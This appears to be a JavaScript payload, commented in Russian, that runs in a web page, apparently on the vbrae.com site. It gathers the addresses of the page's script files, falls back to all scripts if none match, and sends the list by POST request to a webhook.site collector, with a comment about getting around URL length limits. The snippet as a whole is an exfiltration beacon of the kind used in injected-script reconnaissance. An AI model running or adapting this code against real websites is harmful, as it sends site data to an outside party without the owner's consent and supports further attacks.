// Собираем только ВАЖНЫЕ скрипты (исключаем расширения и внешние сервисы)
const scripts = document.querySelectorAll('script[src*="vbrae.com"]');
let sources = '';
scripts.forEach(script => {
  if (script.src.includes('vbrae.com')) { // Фильтруем только внутренние скрипты
    sources += script.src + '\n';
  }
});

// Если внутренних скриптов нет, соберем все, но в формате JSON чтобы уместить
if (sources === '') {
  const allScripts = Array.from(document.querySelectorAll('script')).map(s => s.src);
  sources = JSON.stringify(allScripts); // Отправим как JSON строку
}

// Отправляем на webhook POST-запросом, а не GET (чтобы обойти ограничение длины URL)
fetch('https://webhook.site/bd10e25e-f1b3-4e2f-89b9-7362b1151c96', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ scannedScripts: sources })
});
